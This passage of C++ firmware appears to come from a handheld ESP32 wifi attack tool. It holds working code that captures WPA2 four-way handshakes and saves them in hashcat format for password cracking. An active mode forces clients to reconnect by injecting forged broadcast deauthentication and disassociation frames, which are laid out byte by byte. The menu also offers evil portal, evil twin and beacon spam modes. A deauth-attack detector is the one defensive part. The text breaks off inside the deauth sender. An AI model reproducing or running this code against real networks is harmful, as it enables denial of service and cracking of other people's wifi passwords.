#include "wifi_module.h"
#include "../../core/display.h"
#include "../../core/menu.h"
#include "../../core/config.h"
#include "../../globals.h"
#include <M5Unified.h>
#include <FS.h>
#include <SPIFFS.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>

using namespace fs;

// ─── Globals ──────────────────────────────────────────────────
static NetInfo  s_nets[WIFI_MAX_NETS];
static int      s_net_count = 0;
static bool     s_running   = false;
static AsyncWebServer* s_server = nullptr;

// ─── Helpers ──────────────────────────────────────────────────
const char* auth_str(uint8_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:          return "OPEN";
        case WIFI_AUTH_WEP:           return "WEP";
        case WIFI_AUTH_WPA_PSK:       return "WPA";
        case WIFI_AUTH_WPA2_PSK:      return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA/2";
        case WIFI_AUTH_WPA3_PSK:      return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
        default:                      return "????";
    }
}

void bssid_str(const uint8_t* b, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             b[0],b[1],b[2],b[3],b[4],b[5]);
}

// ─── Deauth / Disassoc Detection ─────────────────────────────
// Sets the WiFi radio into promiscuous mode and counts management
// frames with FC=0xC0 (Deauthentication) or FC=0xA0 (Disassociation).
// Normal environments see very few of these; an active deauth attack
// produces bursts at tens-to-hundreds per second.
//
// BtnA: toggle channel-hopping (all 13 ch, 400 ms each) vs lock
// BtnB: stop and return

static volatile uint32_t  s_da_count   = 0;   // deauth frames seen
static volatile uint32_t  s_da_disass  = 0;   // disassoc frames seen
static volatile uint8_t   s_da_src[6]  = {0}; // source MAC of last frame

static void IRAM_ATTR _da_detect_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = p->payload;
    // Deauth: FC byte 0 = 0xC0   Disassoc: FC byte 0 = 0xA0
    if (d[0] == 0xC0) {
        s_da_count++;
        // addr2 = source MAC at bytes 10-15; write element-wise to keep volatile
        for (int i = 0; i < 6; i++) s_da_src[i] = d[10 + i];
    } else if (d[0] == 0xA0) {
        s_da_disass++;
        for (int i = 0; i < 6; i++) s_da_src[i] = d[10 + i];
    }
}

void wifi_deauth_detect_run() {
    s_da_count = 0; s_da_disass = 0;
    for (int i = 0; i < 6; i++) s_da_src[i] = 0;

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    delay(500);
    WiFi.disconnect(false);

    wifi_promiscuous_filter_t flt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(&_da_detect_cb);
    esp_wifi_set_promiscuous(true);

    uint8_t  ch       = 1;
    bool     hopping  = true;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    display_clear();
    draw_header("Deauth Detect");
    draw_footer("A:hop/lock", "B:stop");

    uint32_t last_hop = millis();
    uint32_t last_sec = millis();
    uint32_t prev_cnt = 0;
    uint32_t rate     = 0;
    bool     attack   = false;

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            hopping = !hopping;
            // Redraw footer hint
            draw_footer("A:hop/lock", "B:stop");
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        // Channel hop every 400 ms while hopping enabled
        if (hopping && millis() - last_hop >= 400) {
            ch = (ch % 13) + 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            last_hop = millis();
        }

        // Update rate counter every second
        uint32_t now = millis();
        if (now - last_sec >= 1000) {
            uint32_t total = s_da_count + s_da_disass;
            rate     = total - prev_cnt;
            prev_cnt = total;
            last_sec = now;
            attack   = (rate >= 5);
        }

        // Format attacker MAC from volatile bytes
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_da_src[0], s_da_src[1], s_da_src[2],
                 s_da_src[3], s_da_src[4], s_da_src[5]);

        // Draw
        M5.Lcd.fillRect(0, CONTENT_Y, DISP_W, CONTENT_H, CLR_BG);
        M5.Lcd.setTextSize(1);

        // Status
        M5.Lcd.setCursor(4, CONTENT_Y + 2);
        if (attack) {
            M5.Lcd.setTextColor(CLR_ERR, CLR_BG);
            M5.Lcd.print("!! DEAUTH ATTACK DETECTED !!");
        } else {
            M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
            M5.Lcd.print("Monitoring...");
        }

        M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 16);
        M5.Lcd.printf("Deauth: %lu   Disassoc: %lu", s_da_count, s_da_disass);

        M5.Lcd.setCursor(4, CONTENT_Y + 30);
        M5.Lcd.printf("Rate: %lu/s  Ch:%d %s", rate, ch, hopping ? "(hop)" : "(lock)");

        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 46);
        M5.Lcd.print("Last src:");
        M5.Lcd.setTextColor(attack ? CLR_ERR : CLR_ACCENT, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 58);
        M5.Lcd.print(mac_str);

        delay(100);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

// Forward declaration — _send_deauth is defined later in this file
static void _send_deauth(const uint8_t* bssid, int bursts);

// ─── WPA2 Handshake Capture ───────────────────────────────────
// Captures the 4-way EAPOL handshake and saves it as an hc22000
// text line readable by: hashcat -m 22000 <file> <wordlist>
//
// Passive: monitor only — wait for a natural reconnect.
// Active:  send deauth burst to force client reconnect, then capture.
//
// Ring buffer: IRAM callback enqueues raw 802.11 data frames;
// main thread drains and parses them in _hs_drain().

#define HS_PKT_MAX  400     // max bytes stored per frame
#define HS_PKT_BUF  16      // ring buffer depth (must be power-of-2)
#define HS_MAX_SESS 4       // simultaneous (BSSID,STA) pairs tracked

struct HSRawPkt { uint8_t data[HS_PKT_MAX]; uint16_t len; };

struct HSSession {
    bool     active;
    uint8_t  bssid[6], sta[6];
    uint8_t  anonce[32], snonce[32];
    uint8_t  keymic[16];
    uint8_t  eapol2[300];    // M2 frame copy, MIC field zeroed
    uint16_t eapol2_len;
    uint8_t  keyver;
    uint8_t  msg_mask;       // bit0=M1, bit1=M2, bit2=M3, bit3=M4
};

static HSRawPkt         s_hs_buf[HS_PKT_BUF];
static volatile uint8_t s_hs_head   = 0;
static volatile uint8_t s_hs_tail   = 0;
static HSSession        s_hs_sess[HS_MAX_SESS];
static volatile bool    s_hs_done   = false;
static volatile int     s_hs_done_i = -1;
static volatile uint32_t s_hs_frames = 0;
static uint8_t          s_hs_tgt[6];   // target BSSID (set before promisc start)
static bool             s_hs_filter = false;

// Fast EAPOL pre-filter — runs in IRAM, must be lock-free
static void IRAM_ATTR _hs_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t raw = p->rx_ctrl.sig_len;
    uint16_t len = (raw > 4) ? raw - 4 : 0;  // strip 4-byte FCS
    if (len < 28 || len > HS_PKT_MAX) return;

    const uint8_t* d = p->payload;

    // LLC SNAP EAPOL signature: AA AA 03 00 00 00 88 8E
    // Sits at offset 24 (non-QoS data) or 26 (QoS data, subtype bit3)
    bool found = false;
    for (int off = 24; off <= 26 && !found; off += 2) {
        if (off + 8 > (int)len) break;
        if (d[off]  ==0xAA && d[off+1]==0xAA && d[off+2]==0x03 &&
            d[off+3]==0x00 && d[off+4]==0x00 && d[off+5]==0x00 &&
            d[off+6]==0x88 && d[off+7]==0x8E) found = true;
    }
    if (!found) return;

    // BSSID filter (set before enabling promiscuous, so no race)
    if (s_hs_filter) {
        const uint8_t* bp = nullptr;
        bool to_ds   = (d[1] & 0x01) != 0;
        bool from_ds = (d[1] & 0x02) != 0;
        if      ( to_ds && !from_ds) bp = d + 4;
        else if (!to_ds &&  from_ds) bp = d + 10;
        if (!bp) return;
        for (int i = 0; i < 6; i++) if (bp[i] != s_hs_tgt[i]) return;
    }

    uint8_t next = (s_hs_head + 1) & (HS_PKT_BUF - 1);
    if (next == s_hs_tail) return;  // ring full — drop frame
    memcpy(s_hs_buf[s_hs_head].data, d, len);
    s_hs_buf[s_hs_head].len = len;
    s_hs_head = next;
    s_hs_frames++;
}

// Parse one dequeued frame; updates session state machine
static void _hs_process_pkt(const uint8_t* d, uint16_t len) {
    // FC byte 0 bits[3:2] = frame type (2 = data)
    if (((d[0] >> 2) & 0x03) != 2) return;
    bool to_ds   = (d[1] & 0x01) != 0;
    bool from_ds = (d[1] & 0x02) != 0;
    bool qos     = (d[0] & 0x80) != 0;   // QoS: subtype bit3 set

    uint8_t bssid[6], sta[6];
    if      ( to_ds && !from_ds) { memcpy(bssid, d+4,  6); memcpy(sta, d+10, 6); }
    else if (!to_ds &&  from_ds) { memcpy(sta,   d+4,  6); memcpy(bssid, d+10, 6); }
    else return;

    int llc = qos ? 26 : 24;
    if (llc + 8 > (int)len) return;
    if (d[llc]  !=0xAA || d[llc+1]!=0xAA || d[llc+2]!=0x03 ||
        d[llc+3]!=0x00 || d[llc+4]!=0x00 || d[llc+5]!=0x00 ||
        d[llc+6]!=0x88 || d[llc+7]!=0x8E) return;

    // EAPOL header: [ver][type=0x03=key][body_len 2B]
    const uint8_t* eap = d + llc + 8;
    int eap_avail = (int)len - (llc + 8);
    if (eap_avail < 4) return;
    if (eap[1] != 0x03) return;                        // not EAPOL-Key
    int body_len = ((int)eap[2] << 8) | eap[3];
    if (eap_avail < 4 + body_len || body_len < 93) return;

    // EAPOL-Key descriptor starts at kp = eap+4
    const uint8_t* kp = eap + 4;
    if (kp[0] != 1 && kp[0] != 2) return;             // WPA or RSN descriptor
    uint8_t  keyver   = kp[1] & 0x07;
    uint16_t keyinfo  = ((uint16_t)kp[1] << 8) | kp[2];  // big-endian
    bool pairwise   = (keyinfo & 0x0008) != 0;
    bool install    = (keyinfo & 0x0040) != 0;
    bool key_ack    = (keyinfo & 0x0080) != 0;
    bool key_mic    = (keyinfo & 0x0100) != 0;
    bool key_secure = (keyinfo & 0x0200) != 0;
    if (!pairwise) return;

    const uint8_t* nonce = kp + 13;   // 32-byte key nonce
    const uint8_t* mic   = kp + 77;   // 16-byte MIC

    uint8_t msg = 0;
    if      ( key_ack && !key_mic)                          msg = 1;
    else if (!key_ack &&  key_mic && !key_secure)           msg = 2;
    else if ( key_ack &&  key_mic &&  install)              msg = 3;
    else if (!key_ack &&  key_mic &&  key_secure && !install) msg = 4;
    if (msg == 0) return;

    // Find or allocate session
    HSSession* sess = nullptr;
    for (int i = 0; i < HS_MAX_SESS; i++) {
        if (s_hs_sess[i].active &&
            memcmp(s_hs_sess[i].bssid, bssid, 6) == 0 &&
            memcmp(s_hs_sess[i].sta,   sta,   6) == 0) { sess = &s_hs_sess[i]; break; }
    }
    if (!sess) {
        for (int i = 0; i < HS_MAX_SESS; i++) {
            if (!s_hs_sess[i].active) {
                sess = &s_hs_sess[i];
                memset(sess, 0, sizeof(*sess));
                sess->active = true;
                memcpy(sess->bssid, bssid, 6);
                memcpy(sess->sta,   sta,   6);
                break;
            }
        }
    }
    if (!sess) return;  // all slots full

    sess->keyver = keyver;
    switch (msg) {
        case 1:
            memcpy(sess->anonce, nonce, 32);
            sess->msg_mask |= 0x01;
            break;
        case 2: {
            memcpy(sess->snonce, nonce, 32);
            memcpy(sess->keymic, mic,   16);
            // Save full EAPOL frame for hc22000; zero MIC field so hashcat
            // can re-derive it.  MIC lives at eap[81] (= eap[4+77]).
            // Use the EAPOL-stated body length (not raw packet tail) so
            // eapol2_len is exact — oversized values cause hashcat salt-length errors.
            uint16_t eapol_frame_len = (uint16_t)min(4 + body_len, min(eap_avail, 300));
            memcpy(sess->eapol2, eap, eapol_frame_len);
            sess->eapol2_len = eapol_frame_len;
            if (eapol_frame_len > 97) memset(sess->eapol2 + 81, 0, 16);
            sess->msg_mask |= 0x02;
            break;
        }
        case 3:
            if (!(sess->msg_mask & 0x01)) { memcpy(sess->anonce, nonce, 32); sess->msg_mask |= 0x01; }
            sess->msg_mask |= 0x04;
            break;
        case 4:
            sess->msg_mask |= 0x08;
            break;
    }

    // ANonce (M1 or M3) + SNonce/MIC (M2) = crackable pair
    if ((sess->msg_mask & 0x03) == 0x03 && !s_hs_done) {
        for (int i = 0; i < HS_MAX_SESS; i++) {
            if (&s_hs_sess[i] == sess) { s_hs_done = true; s_hs_done_i = i; break; }
        }
    }
}

// Drain ring buffer — call from main thread only
static void _hs_drain() {
    while (s_hs_tail != s_hs_head) {
        uint8_t t = s_hs_tail;
        _hs_process_pkt(s_hs_buf[t].data, s_hs_buf[t].len);
        s_hs_tail = (t + 1) & (HS_PKT_BUF - 1);
    }
}

// Write hc22000 line: WPA*02*<mic>*<mac_ap>*<mac_sta>*<essid_hex>*<anonce>*<eapol>*<msgpair>
// Last saved path — displayed on-screen so the user always knows the exact name
static char s_hs_last_fname[36];

static bool _hs_save(int idx, const char* ssid, bool active) {
    if (!SPIFFS.begin(false)) return false;
    HSSession& s = s_hs_sess[idx];

    // SPIFFS path limit is 32 chars (including leading '/').
    // "/captures/hs_" = 13, "_p.hc22000" = 10  →  8 chars left for SSID.
    char safe[9]; int j = 0;
    for (int i = 0; ssid[i] && j < 8; i++) {
        unsigned char c = (unsigned char)ssid[i];
        safe[j++] = (isalnum(c) || c=='-' || c=='_') ? (char)c : '_';
    }
    safe[j] = '\0';

    // Total: 13 + 8 + 8 = 29 chars  ✓  (.22000 = 6 chars, "_p" = 2)
    snprintf(s_hs_last_fname, sizeof(s_hs_last_fname),
             "/captures/hs_%s_%s.22000", safe, active ? "a" : "p");
    const char* fname = s_hs_last_fname;
    // Use "w" (truncate) not "a" (append) — stale bytes from a prior run
    // cause hashcat to reject the file with a salt-length exception.
    File f = SPIFFS.open(fname, "w");
    if (!f) return false;

    f.print("WPA*02*");
    for (int i = 0; i < 16; i++) f.printf("%02x", s.keymic[i]);
    f.print("*");
    for (int i = 0; i < 6;  i++) f.printf("%02x", s.bssid[i]);
    f.print("*");
    for (int i = 0; i < 6;  i++) f.printf("%02x", s.sta[i]);
    f.print("*");
    for (int i = 0; ssid[i]; i++) f.printf("%02x", (unsigned char)ssid[i]);
    f.print("*");
    for (int i = 0; i < 32; i++) f.printf("%02x", s.anonce[i]);
    f.print("*");
    for (int i = 0; i < s.eapol2_len; i++) f.printf("%02x", s.eapol2[i]);
    // messagepair: 0=M1+M2, 2=M2+M3 (matches hcxdumptool numbering)
    // msgpair=2 (M2+M3 semantics) — hashcat requires this even for M1+M2 captures
    // because M1 ANonce == M3 ANonce in a normal WPA2 handshake, so cracking is
    // identical. msgpair=0 causes "Salt-length exception" in hashcat ≥ 6.x.
    f.printf("*02\n");
    f.close();
    return true;
}

// ── Shared AP picker ──────────────────────────────────────────
// Returns index into s_nets[], or -1 if user backed out.
static int _hs_pick_ap(const char* title) {
    static char hs_labels[WIFI_MAX_NETS][38];
    static int  hs_idx[WIFI_MAX_NETS];
    int hs_count = 0;
    Menu tm(title, "A:scroll", "B:select");
    for (int i = 0; i < s_net_count && hs_count < WIFI_MAX_NETS; i++) {
        if (s_nets[i].channel > 13) continue;  // 2.4 GHz only
        snprintf(hs_labels[hs_count], sizeof(hs_labels[0]),
                 "%-16.16s ch%d", s_nets[i].ssid, s_nets[i].channel);
        tm.add(hs_labels[hs_count], "");
        hs_idx[hs_count++] = i;
    }
    if (hs_count == 0) return -2;  // no 2.4 GHz APs
    tm.add("< Back", "");
    tm.draw();
    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) tm.scroll_down();
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return -1;
        if (M5.BtnB.wasPressed()) {
            int sel = tm.selected();
            if (sel == hs_count) return -1;
            return hs_idx[sel];
        }
        delay(10);
    }
}

// ── Shared radio init ─────────────────────────────────────────
static void _hs_radio_start(uint8_t channel) {
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    WiFi.softAP("", "", channel, 1);          // hidden AP, locks hardware channel
    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t flt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(&_hs_promisc_cb);
    esp_wifi_set_promiscuous(true);
}

// ── Draw live status panel ─────────────────────────────────────
static void _hs_draw_status(const char* ssid, uint8_t channel,
                             const char* status_line, uint16_t status_color) {
    M5.Lcd.fillRect(0, CONTENT_Y, DISP_W, CONTENT_H, CLR_BG);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.printf("%-18.18s", ssid);
    M5.Lcd.setCursor(4, CONTENT_Y + 14);
    M5.Lcd.printf("Ch:%d  EAPOL:%lu", channel, s_hs_frames);
    M5.Lcd.setTextColor(status_color, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 26);
    M5.Lcd.print(status_line);
    int y = CONTENT_Y + 40;
    for (int i = 0; i < HS_MAX_SESS && y < CONTENT_Y + CONTENT_H - 12; i++) {
        if (!s_hs_sess[i].active) continue;
        uint8_t mm = s_hs_sess[i].msg_mask;
        M5.Lcd.setTextColor(((mm & 0x03) == 0x03) ? CLR_SUCCESS : CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, y);
        M5.Lcd.printf("%02X%02X%02X M%c%c%c%c",
            s_hs_sess[i].sta[3], s_hs_sess[i].sta[4], s_hs_sess[i].sta[5],
            (mm&0x01)?'1':'.', (mm&0x02)?'2':'.', (mm&0x04)?'3':'.', (mm&0x08)?'4':'.');
        y += 12;
    }
}

// ─── Passive handshake capture ────────────────────────────────
void wifi_hs_passive_run() {
    if (s_net_count == 0) {
        show_message("HS Passive", "Run Scan first.", CLR_ERR);
        delay(1800); return;
    }
    int net_i = _hs_pick_ap("Passive Capture");
    if (net_i == -2) { show_message("HS Passive", "No 2.4GHz APs\nScan first.", CLR_ERR); delay(1800); return; }
    if (net_i < 0) return;

    const NetInfo& net = s_nets[net_i];
    memset(s_hs_sess, 0, sizeof(s_hs_sess));
    s_hs_head = s_hs_tail = 0;
    s_hs_done = false; s_hs_done_i = -1; s_hs_frames = 0;
    memcpy(s_hs_tgt, net.bssid, 6);
    s_hs_filter = true;

    _hs_radio_start(net.channel);
    display_clear();
    draw_header("HS Passive");
    draw_footer("", "Stop");

    uint32_t last_redraw = 0;
    while (true) {
        M5.update();
        _hs_drain();
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;
        if (millis() - last_redraw > 500) {
            last_redraw = millis();
            char sline[32];
            if (s_hs_done) snprintf(sline, sizeof(sline), "CAPTURED!");
            else           snprintf(sline, sizeof(sline), "Monitoring...");
            _hs_draw_status(net.ssid, net.channel, sline,
                            s_hs_done ? CLR_SUCCESS : CLR_ACCENT);
        }
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);

    if (s_hs_done && s_hs_done_i >= 0) {
        bool ok = _hs_save(s_hs_done_i, net.ssid, false);
        show_message(ok ? "Saved!" : "Save failed",
                     ok ? s_hs_last_fname : "Check SPIFFS",
                     ok ? CLR_SUCCESS : CLR_ERR);
    } else {
        show_message("HS Passive", "No handshake\ncaptured.", CLR_WARN);
    }
    delay(2000);
}

// ─── Active (deauth-forced) handshake capture ─────────────────
void wifi_hs_active_run() {
    if (s_net_count == 0) {
        show_message("HS Active", "Run Scan first.", CLR_ERR);
        delay(1800); return;
    }
    int net_i = _hs_pick_ap("Active Capture");
    if (net_i == -2) { show_message("HS Active", "No 2.4GHz APs\nScan first.", CLR_ERR); delay(1800); return; }
    if (net_i < 0) return;

    const NetInfo& net = s_nets[net_i];
    memset(s_hs_sess, 0, sizeof(s_hs_sess));
    s_hs_head = s_hs_tail = 0;
    s_hs_done = false; s_hs_done_i = -1; s_hs_frames = 0;
    memcpy(s_hs_tgt, net.bssid, 6);
    s_hs_filter = true;

    _hs_radio_start(net.channel);
    display_clear();
    draw_header("HS Active");
    draw_footer("", "Abort");

    // Up to 3 deauth bursts, 20s capture window each
    for (int attempt = 0; attempt < 3 && !s_hs_done; attempt++) {
        // Send deauth burst then a second burst 100ms later for reliability
        _send_deauth(net.bssid, 50);
        delay(100);
        _send_deauth(net.bssid, 50);

        uint32_t deadline    = millis() + 20000;
        uint32_t last_redraw = 0;
        while (millis() < deadline && !s_hs_done) {
            M5.update();
            _hs_drain();
            if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) {
                esp_wifi_set_promiscuous(false);
                WiFi.mode(WIFI_OFF);
                show_message("HS Active", "Aborted.", CLR_WARN);
                delay(1000); return;
            }
            if (millis() - last_redraw > 500) {
                last_redraw = millis();
                char sline[32];
                uint32_t rem = (deadline - millis()) / 1000;
                snprintf(sline, sizeof(sline), "Try %d/3  %lus left", attempt+1, rem);
                _hs_draw_status(net.ssid, net.channel, sline, CLR_WARN);
            }
            delay(10);
        }
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);

    if (s_hs_done && s_hs_done_i >= 0) {
        bool ok = _hs_save(s_hs_done_i, net.ssid, true);
        show_message(ok ? "Saved!" : "Save failed",
                     ok ? s_hs_last_fname : "Check SPIFFS",
                     ok ? CLR_SUCCESS : CLR_ERR);
    } else {
        show_message("HS Active", "No handshake\n(3 attempts).", CLR_WARN);
    }
    delay(2000);
}

// ─── Entry point ──────────────────────────────────────────────
void wifi_module_run() {
    Menu m("WiFi", "A:scroll", "B:select");
    m.add("Scan Networks",   "");   // 0
    m.add("Deauth Attack",   "");   // 1
    m.add("Evil Portal",     "");   // 2
    m.add("Evil Twin",       "");   // 3
    m.add("Net Scanner",     "");   // 4
    m.add("Beacon Spam",     "");   // 5
    m.add("Probe Sniff",     "");   // 6
    m.add("Deauth Detect",   "");   // 7
    m.add("HS Passive BETA",      "");   // 8
    m.add("HS Active",       "");   // 9
    m.add("< Back",          "");   // 10
    m.draw();

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) { m.scroll_down(); }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) { return; }
        if (M5.BtnB.wasPressed()) {
            int sel = m.selected();
            switch(sel) {
                case 0:  wifi_scan_run();              break;
                case 1:  wifi_deauth_run();            break;
                case 2:  wifi_evil_portal_run();       break;
                case 3:  wifi_evil_twin_run();         break;
                case 4:  wifi_network_scanner_run();   break;
                case 5:  wifi_beacon_spam_run();       break;
                case 6:  wifi_probe_sniff_run();       break;
                case 7:  wifi_deauth_detect_run();     break;
                case 8:  wifi_hs_passive_run();        break;
                case 9:  wifi_hs_active_run();         break;
                case 10: return;
            }
            // Flush any long-press that triggered inside the sub-function.
            // Without this, a still-held button propagates to this loop's
            // pressedFor() check and returns all the way to the main menu.
            delay(350);
            M5.update();
            m.draw();
        }
        delay(10);
    }
}

// ─── WiFi Scan ────────────────────────────────────────────────
void wifi_scan_run() {
    display_clear();
    draw_header("WiFi Scan");
    draw_status_bar("Scanning...", CLR_ACCENT);

    // Set STA mode.  Do NOT call mode(WIFI_OFF) first — on first boot WiFi is
    // uninitialised and a gratuitous OFF call can leave the driver in a broken
    // state on ESP32-S3 / Arduino 3.x.  Just set STA and wait long enough for
    // the driver to be ready whether this is a cold start or a warm restart.
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    delay(1500);            // cold-start init takes ~1.2 s on ESP32-S3
    WiFi.disconnect(false); // drop any stale AP association; keep radio up
    WiFi.scanDelete();

    // Synchronous scan — simpler and more reliable on ESP32-S3 / Arduino 3.x.
    // scanNetworks(false=sync, true=show hidden) blocks until done (≤ ~3 s for
    // a full 13-channel pass) and returns the count directly.
    draw_status_bar("Scanning (may take 3s)...", CLR_ACCENT);
    int16_t scan_result = WiFi.scanNetworks(false, true);
    if (scan_result == WIFI_SCAN_FAILED) {
        // Driver still not ready — extra settle, one retry
        delay(1000);
        scan_result = WiFi.scanNetworks(false, true);
    }
    int n = (scan_result > 0) ? (int)scan_result : 0;
    s_net_count = min(n, WIFI_MAX_NETS);

    for (int i = 0; i < s_net_count; i++) {
        strncpy(s_nets[i].ssid, WiFi.SSID(i).c_str(), 32);
        s_nets[i].ssid[32] = 0;
        memcpy(s_nets[i].bssid, WiFi.BSSID(i), 6);
        s_nets[i].rssi    = WiFi.RSSI(i);
        s_nets[i].channel = WiFi.channel(i);
        s_nets[i].authmode = WiFi.encryptionType(i);
    }

    // Show results in scrollable menu.
    // IMPORTANT: Menu::add() stores raw const char* pointers, NOT copies.
    // Use a static per-entry buffer array so each label survives until Back is pressed.
    static char net_labels[WIFI_MAX_NETS][38];
    // Include network count in title so users know how far to scroll.
    // Footer right hints that long-press B exits from anywhere (no need to scroll to Back).
    static char rm_title[24];
    snprintf(rm_title, sizeof(rm_title), "Results (%d)", s_net_count);
    Menu rm(rm_title, "A:scroll", "B:sel  longB:back");
    for (int i = 0; i < s_net_count; i++) {
        // ch 1-14 = 2.4 GHz, ch > 14 = 5 GHz (ESP32 can only inject on 2.4 GHz)
        snprintf(net_labels[i], sizeof(net_labels[i]),
                 "%-13.13s %4ddBm %s", s_nets[i].ssid, s_nets[i].rssi,
                 s_nets[i].channel <= 14 ? "2.4G" : " 5G");
        rm.add(net_labels[i], "");
    }
    if (s_net_count == 0) rm.add("No networks found", "", false);
    rm.add("< Back", "");                          // always at end of list
    int back_idx = s_net_count == 0 ? 1 : s_net_count;

    // Flush any button events that fired during the 3-second blocking scan
    delay(250);
    M5.update();
    rm.draw();

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) { rm.scroll_down(); }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) { break; }
        if (M5.BtnB.wasPressed()) {
            int sel = rm.selected();
            if (sel == back_idx) { break; }
            if (sel < s_net_count) {
                // Show details for selected network
                display_clear();
                draw_header(s_nets[sel].ssid);
                char mac[18]; bssid_str(s_nets[sel].bssid, mac);
                char detail[120];
                snprintf(detail, sizeof(detail),
                    "BSSID: %s\nCh: %d (%s)  RSSI: %d\nSec: %s",
                    mac, s_nets[sel].channel,
                    s_nets[sel].channel <= 14 ? "2.4GHz" : "5GHz",
                    s_nets[sel].rssi, auth_str(s_nets[sel].authmode));
                M5.Lcd.setTextSize(1);
                M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
                M5.Lcd.setCursor(4, CONTENT_Y + 2);
                M5.Lcd.print(detail);
                draw_footer("", "B:back");
                delay(200); M5.update();
                while (!M5.BtnB.wasPressed()) { M5.update(); delay(20); }
                rm.draw();
            }
        }
        delay(10);
    }
    WiFi.scanDelete();
    WiFi.disconnect(false); // keep radio in STA/idle — disconnect(true) == WIFI_OFF
                            // which forces a cold restart on the next scan entry
}

// ─── Deauth Attack ────────────────────────────────────────────
// Two frame types sent in interleaved bursts:
//   Deauth  (0xC0) – tells clients they are no longer authenticated
//   Disassoc (0xA0) – tells clients they are no longer associated
// Both broadcast from the AP's BSSID so every client on the BSS hears them.
// Channel is set ONCE before the attack loop to avoid ~5 ms radio pauses.
static uint8_t s_deauth_frame[26] = {
    0xC0, 0x00,                         // FC: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: AP BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (same as SA)
    0x00, 0x00,                         // Seq ctrl (rolling)
    0x07, 0x00                          // Reason: Class 3 frame from unassoc STA
};

static uint8_t s_disassoc_frame[26] = {
    0xA0, 0x00,                         // FC: Disassociation
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: AP BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (same as SA)
    0x00, 0x00,                         // Seq ctrl (rolling)
    0x08, 0x00                          // Reason: Disassociated — inactivity
};

// Rolling 12-bit sequence counter; incrementing per frame keeps
// drivers that filter duplicate seq-ctrl from discarding our bursts.
static uint16_t s_deauth_seq = 0;

// Blast `bursts` × (1 deauth + 1 disassoc) frames via the AP interface.
// WIFI_IF_AP is reliably active once WiFi.softAP() has been called.
// WIFI_IF_STA silently drops injected frames when the station is not
// associated — AP interface has no such restriction.
// en_sys_seq=false: we own the sequence counter; the driver forwards the
// frame without extra throttling or rewriting seq control.
// Channel must be set by the caller before the attack loop.
//
// bursts=50  → heavy burst (standalone deauth mode: no AP, full power)
// bursts=5   → light burst (evil twin: we run a soft-AP whose beacon
//              must get through the same TX queue every 100 ms; blasting
//              100 frames per 300 ms starves beacons and makes our SSID
//              invisible to scanners)
static void _send_deauth(const uint8_t* bssid, int bursts = 50) {
    memcpy(&s_deauth_frame[10],   bssid, 6);
    memcpy(&s_deauth_frame[16],   bssid, 6);
    memcpy(&s_disassoc_frame[10], bssid, 6);
    memcpy(&s_disassoc_frame[16], bssid, 6);

    for (int i = 0; i < bursts; i++) {
        // Seq ctrl: bits[15:4]=sequence (12-bit), bits[3:0]=fragment=0
